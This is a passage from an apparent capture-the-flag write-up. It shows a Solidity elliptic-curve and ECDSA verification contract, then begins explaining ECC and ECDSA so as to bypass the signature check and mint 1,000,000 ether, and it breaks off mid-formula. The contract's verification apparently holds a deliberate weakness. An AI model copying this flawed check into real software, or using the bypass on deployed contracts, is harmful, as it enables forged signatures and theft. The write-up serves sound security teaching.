</span><span style=color:#969896;font-style:italic>     * @dev Transform from projective to affine coordinates.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>toAffinePoint</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0, </span><span style=color:#0086b3>uint </span><span>z0) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x1, </span><span style=color:#0086b3>uint</span><span> y1)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> z0Inv;
</span><span>        z0Inv </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>inverseMod</span><span>(z0, p);
</span><span>        x1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(x0, z0Inv, p);
</span><span>        y1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y0, z0Inv, p);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Return the zero curve in projective coordinates.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>zeroProj</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x, </span><span style=color:#0086b3>uint</span><span> y, </span><span style=color:#0086b3>uint</span><span> z)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(0, 1, 0);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Return the zero curve in affine coordinates.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>zeroAffine</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x, </span><span style=color:#0086b3>uint</span><span> y)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(0, 0);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Check if the curve is the zero curve.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isZeroCurve</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>bool</span><span> isZero)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(x0 </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 && y0 == 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Check if a point in affine coordinates is on the curve.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isOnCurve</span><span>(</span><span style=color:#0086b3>uint </span><span>x, </span><span style=color:#0086b3>uint </span><span>y) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>bool</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(0 == x || x == p || 0 == y || y == p) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint</span><span> LHS </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y, y, p); </span><span style=color:#969896;font-style:italic>// y^2
</span><span>        </span><span style=color:#0086b3>uint</span><span> RHS </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(</span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(x, x, p), x, p); </span><span style=color:#969896;font-style:italic>// x^3
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(a </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>            RHS </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(RHS, </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(x, a, p), p); </span><span style=color:#969896;font-style:italic>// x^3 + a*x
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(b </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0) {
</span><span>            RHS </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(RHS, b, p); </span><span style=color:#969896;font-style:italic>// x^3 + a*x + b
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> LHS </span><span style=color:#a71d5d;font-weight:700>==</span><span> RHS;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Double an elliptic curve point in projective coordinates. See
</span><span style=color:#969896;font-style:italic>     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>twiceProj</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0, </span><span style=color:#0086b3>uint </span><span>z0) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x1, </span><span style=color:#0086b3>uint</span><span> y1, </span><span style=color:#0086b3>uint</span><span> z1)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> t;
</span><span>        </span><span style=color:#0086b3>uint</span><span> u;
</span><span>        </span><span style=color:#0086b3>uint</span><span> v;
</span><span>        </span><span style=color:#0086b3>uint</span><span> w;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(</span><span style=color:#62a35c>isZeroCurve</span><span>(x0, y0)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>zeroProj</span><span>();
</span><span>        }
</span><span>
</span><span>        u </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y0, z0, p);
</span><span>        u </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u, 2, p);
</span><span>
</span><span>        v </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u, x0, p);
</span><span>        v </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(v, y0, p);
</span><span>        v </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(v, 2, p);
</span><span>
</span><span>        x0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(x0, x0, p);
</span><span>        t </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(x0, 3, p);
</span><span>
</span><span>        z0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(z0, z0, p);
</span><span>        z0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(z0, a, p);
</span><span>        t </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(t, z0, p);
</span><span>
</span><span>        w </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(t, t, p);
</span><span>        x0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(2, v, p);
</span><span>        w </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(w, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>x0, p);
</span><span>
</span><span>        x0 </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(v, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>w, p);
</span><span>        x0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(t, x0, p);
</span><span>        y0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y0, u, p);
</span><span>        y0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y0, y0, p);
</span><span>        y0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(2, y0, p);
</span><span>        y1 </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(x0, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>y0, p);
</span><span>
</span><span>        x1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u, w, p);
</span><span>
</span><span>        z1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u, u, p);
</span><span>        z1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(z1, u, p);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Add two elliptic curve points in projective coordinates. See
</span><span style=color:#969896;font-style:italic>     * https://www.nayuki.io/page/elliptic-curve-point-addition-in-projective-coordinates
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addProj</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0, </span><span style=color:#0086b3>uint </span><span>z0, </span><span style=color:#0086b3>uint </span><span>x1, </span><span style=color:#0086b3>uint </span><span>y1, </span><span style=color:#0086b3>uint </span><span>z1) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x2, </span><span style=color:#0086b3>uint</span><span> y2, </span><span style=color:#0086b3>uint</span><span> z2)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> t0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> t1;
</span><span>        </span><span style=color:#0086b3>uint</span><span> u0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> u1;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#62a35c>isZeroCurve</span><span>(x0, y0)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>(x1, y1, z1);
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(</span><span style=color:#62a35c>isZeroCurve</span><span>(x1, y1)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>(x0, y0, z0);
</span><span>        }
</span><span>
</span><span>        t0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y0, z1, p);
</span><span>        t1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(y1, z0, p);
</span><span>
</span><span>        u0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(x0, z1, p);
</span><span>        u1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(x1, z0, p);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(u0 </span><span style=color:#a71d5d;font-weight:700>==</span><span> u1) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(t0 </span><span style=color:#a71d5d;font-weight:700>==</span><span> t1) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>twiceProj</span><span>(x0, y0, z0);
</span><span>            }
</span><span>            </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>                </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>zeroProj</span><span>();
</span><span>            }
</span><span>        }
</span><span>
</span><span>        (x2, y2, z2) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>addProj2</span><span>(</span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(z0, z1, p), u0, u1, t1, t0);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Helper function that splits addProj to avoid too many local variables.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addProj2</span><span>(</span><span style=color:#0086b3>uint </span><span>v, </span><span style=color:#0086b3>uint </span><span>u0, </span><span style=color:#0086b3>uint </span><span>u1, </span><span style=color:#0086b3>uint </span><span>t1, </span><span style=color:#0086b3>uint </span><span>t0) </span><span style=color:#a71d5d;font-weight:700>private view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x2, </span><span style=color:#0086b3>uint</span><span> y2, </span><span style=color:#0086b3>uint</span><span> z2)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> u;
</span><span>        </span><span style=color:#0086b3>uint</span><span> u2;
</span><span>        </span><span style=color:#0086b3>uint</span><span> u3;
</span><span>        </span><span style=color:#0086b3>uint</span><span> w;
</span><span>        </span><span style=color:#0086b3>uint</span><span> t;
</span><span>
</span><span>        t </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(t0, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>t1, p);
</span><span>        u </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(u0, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>u1, p);
</span><span>        u2 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u, u, p);
</span><span>
</span><span>        w </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(t, t, p);
</span><span>        w </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(w, v, p);
</span><span>        u1 </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(u1, u0, p);
</span><span>        u1 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u1, u2, p);
</span><span>        w </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(w, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>u1, p);
</span><span>
</span><span>        x2 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u, w, p);
</span><span>
</span><span>        u3 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u2, u, p);
</span><span>        u0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u0, u2, p);
</span><span>        u0 </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(u0, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>w, p);
</span><span>        t </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(t, u0, p);
</span><span>        t0 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(t0, u3, p);
</span><span>
</span><span>        y2 </span><span style=color:#a71d5d;font-weight:700>= addmod</span><span>(t, p</span><span style=color:#a71d5d;font-weight:700>-</span><span>t0, p);
</span><span>
</span><span>        z2 </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(u3, v, p);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Add two elliptic curve points in affine coordinates.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>add</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0, </span><span style=color:#0086b3>uint </span><span>x1, </span><span style=color:#0086b3>uint </span><span>y1) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>, </span><span style=color:#0086b3>uint</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> z0;
</span><span>
</span><span>        (x0, y0, z0) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>addProj</span><span>(x0, y0, 1, x1, y1, 1);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>toAffinePoint</span><span>(x0, y0, z0);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Double an elliptic curve point in affine coordinates.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>twice</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>, </span><span style=color:#0086b3>uint</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> z0;
</span><span>
</span><span>        (x0, y0, z0) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>twiceProj</span><span>(x0, y0, 1);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>toAffinePoint</span><span>(x0, y0, z0);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Multiply an elliptic curve point by a 2 power base (i.e., (2^exp)*P)).
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>multiplyPowerBase2</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0, </span><span style=color:#0086b3>uint </span><span>exp) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>, </span><span style=color:#0086b3>uint</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#0086b3>uint</span><span> base2X </span><span style=color:#a71d5d;font-weight:700>=</span><span> x0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> base2Y </span><span style=color:#a71d5d;font-weight:700>=</span><span> y0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> base2Z </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>for</span><span>(</span><span style=color:#0086b3>uint</span><span> i </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0; i &lt; exp; i++) {
</span><span>            (base2X, base2Y, base2Z) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>twiceProj</span><span>(base2X, base2Y, base2Z);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>toAffinePoint</span><span>(base2X, base2Y, base2Z);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Multiply an elliptic curve point by a scalar.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>multiplyScalar</span><span>(</span><span style=color:#0086b3>uint </span><span>x0, </span><span style=color:#0086b3>uint </span><span>y0, </span><span style=color:#0086b3>uint </span><span>scalar) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span> x1, </span><span style=color:#0086b3>uint</span><span> y1)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(scalar </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>zeroAffine</span><span>();
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(scalar </span><span style=color:#a71d5d;font-weight:700>==</span><span> 1) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>(x0, y0);
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(scalar </span><span style=color:#a71d5d;font-weight:700>==</span><span> 2) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>twice</span><span>(x0, y0);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint</span><span> base2X </span><span style=color:#a71d5d;font-weight:700>=</span><span> x0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> base2Y </span><span style=color:#a71d5d;font-weight:700>=</span><span> y0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> base2Z </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>        </span><span style=color:#0086b3>uint</span><span> z1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>        x1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> x0;
</span><span>        y1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> y0;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(scalar</span><span style=color:#a71d5d;font-weight:700>%</span><span>2 == 0) {
</span><span>            x1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> y1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        }
</span><span>
</span><span>        scalar </span><span style=color:#a71d5d;font-weight:700>=</span><span> scalar </span><span style=color:#a71d5d;font-weight:700>>></span><span> 1;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>while</span><span>(scalar </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>            (base2X, base2Y, base2Z) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>twiceProj</span><span>(base2X, base2Y, base2Z);
</span><span>
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if</span><span>(scalar</span><span style=color:#a71d5d;font-weight:700>%</span><span>2 == 1) {
</span><span>                (x1, y1, z1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>addProj</span><span>(base2X, base2Y, base2Z, x1, y1, z1);
</span><span>            }
</span><span>
</span><span>            scalar </span><span style=color:#a71d5d;font-weight:700>=</span><span> scalar </span><span style=color:#a71d5d;font-weight:700>>></span><span> 1;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>toAffinePoint</span><span>(x1, y1, z1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Multiply the curve's generator point by a scalar.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>multipleGeneratorByScalar</span><span>(</span><span style=color:#0086b3>uint </span><span>scalar) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint</span><span>, </span><span style=color:#0086b3>uint</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>multiplyScalar</span><span>(gx, gy, scalar);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * @dev Validate combination of message, signature, and public key.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>validateSignature</span><span>(</span><span style=color:#0086b3>bytes32 </span><span>message, </span><span style=color:#0086b3>uint</span><span>[</span><span style=color:#0086b3>2</span><span>] </span><span style=color:#a71d5d;font-weight:700>memory </span><span>rs, </span><span style=color:#0086b3>uint</span><span>[</span><span style=color:#0086b3>2</span><span>] </span><span style=color:#a71d5d;font-weight:700>memory </span><span>Q) </span><span style=color:#a71d5d;font-weight:700>public view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>bool</span><span>)
</span><span>    {
</span><span>        </span><span style=color:#969896;font-style:italic>// To disambiguate between public key solutions, include comment below.
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(rs[0] </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 || rs[0] >= p || rs[1] == 0) {</span><span style=color:#969896;font-style:italic>// || rs[1] > lowSmax)
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span style=color:#62a35c>isOnCurve</span><span>(Q[0], Q[1])) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint</span><span> x1;
</span><span>        </span><span style=color:#0086b3>uint</span><span> x2;
</span><span>        </span><span style=color:#0086b3>uint</span><span> y1;
</span><span>        </span><span style=color:#0086b3>uint</span><span> y2;
</span><span>
</span><span>        </span><span style=color:#0086b3>uint</span><span> sInv </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>inverseMod</span><span>(rs[1], p);
</span><span>        (x1, y1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>multiplyScalar</span><span>(gx, gy, </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(</span><span style=color:#0086b3>uint</span><span>(message), sInv, p));
</span><span>        (x2, y2) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>multiplyScalar</span><span>(Q[0], Q[1], </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(rs[0], sInv, p));
</span><span>        </span><span style=color:#0086b3>uint</span><span>[3] memory P </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>addAndReturnProjectivePoint</span><span>(x1, y1, x2, y2);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(P[2] </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint</span><span> Px </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>inverseMod</span><span>(P[2], p);
</span><span>        Px </span><span style=color:#a71d5d;font-weight:700>= mulmod</span><span>(P[0], </span><span style=color:#a71d5d;font-weight:700>mulmod</span><span>(Px, Px, p), p);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> Px </span><span style=color:#a71d5d;font-weight:700>%</span><span> p </span><span style=color:#a71d5d;font-weight:700>==</span><span> rs[0];
</span><span>    }
</span><span>}
</span><span>
</span></code></pre></div></div><h2 id=solution-8>Solution</h2><p>Aaah.. Mathematics, Cryptography and Smart contracts and elite combination here. The goal is very clear here we need to call the <code>mint()</code> function with the amount <code>1_000_000 ether</code>. The challenge for us is to pass the signature verification.<p>So, what the heck is the math is doing in the solidity smart contract? Well it is an <strong>Elliptic Curve</strong> Cryptography scheme implementation. To be precisely it is a <strong>SECP256R1</strong> curve.<p>Now, first learn a bit about the <strong>ECC</strong> and how an implementation looks.<h3 id=elliptic-curve-cryptography>Elliptic Curve Cryptography</h3><p>Elliptic Curve Cryptography (ECC) is an asymmetric cryptographic that provides the same level of security as RSA or discrete logarithm systems with considerably shorter operands (approximately 160‚Äì256 bit vs. 1024‚Äì3072 bit). An elliptic curve is a special type of polynomial equation. For cryptographic use, we need to consider the curve not over the real numbers but over a finite field.<p>This is how an ECC equations looks like,</p><center> <p>\( E:Y^2 = X^3+aX+b \)</p> <img height=50% src=/assets/img/ctf_img/statemind25/statemind_fallout1.png width=50%> </center><p>There is point P, 2P and a straight line marked on the graph. These are the operations we can perform on Elliptic Curves. Addition of two points (P, Q) will result point R. IF we double the same point (P+P) will result in a 2P. If I did this point addition for <code>n</code> times, i.e, \( Q = n*P \). Now I'll give you the values of <code>Q,P</code> can you find what is <code>n</code>? This is where the ECC security lies.<p>Let's see how a secure signing and verification process looks like,<h3 id=ecdsa-signing-process>ECDSA Signing Process</h3><p>A user selects a private key \( d \) where \( 1 \leq d &lt; n \) and computes the public key: \( Q = d \cdot G \)<ol><li><p>Compute the message hash \( z \) (typically \( z = H(m) \), using SHA-256).</p><li><p>Select a random integer \( k \) where \( 1 \leq k &lt; n \).</p><li><p>Compute the elliptic curve point:</p> <p>\[ (x_1, y_1) = k \cdot G \]</p><li><p>Compute the first signature component:</p> <p>\[ r = x_1 \mod n \]</p> <p>If \( r = 0 \), choose a new \( k \) and repeat.</p><li><p>Compute the second signature component:</p> <p>\[ s = k^{-1} (z + r d) \mod n \]</p> <p>If \( s = 0 \), choose a new \( k \) and repeat.</p><li><p>The signature is \( (r, s) \).</p></ol><h3 id=ecdsa-verification-process>ECDSA Verification Process</h3><p>Given a signature \( (r, s) \) and public key \( Q \):<ol><li><p>Compute the message hash \( z = H(m) \).</p><li><p>Compute the modular inverse of \( s \) modulo \( n \):</p> <p>\[ s^{-1} \mod n \]</p><li><p>Compute:</p> <p>\[ u_1 = z s^{-1} \mod n \]</p> <p>\[ u_2 = r s^{-1} \mod n \]</p><li><p>Compute the elliptic curve point:</p> <p>\[ 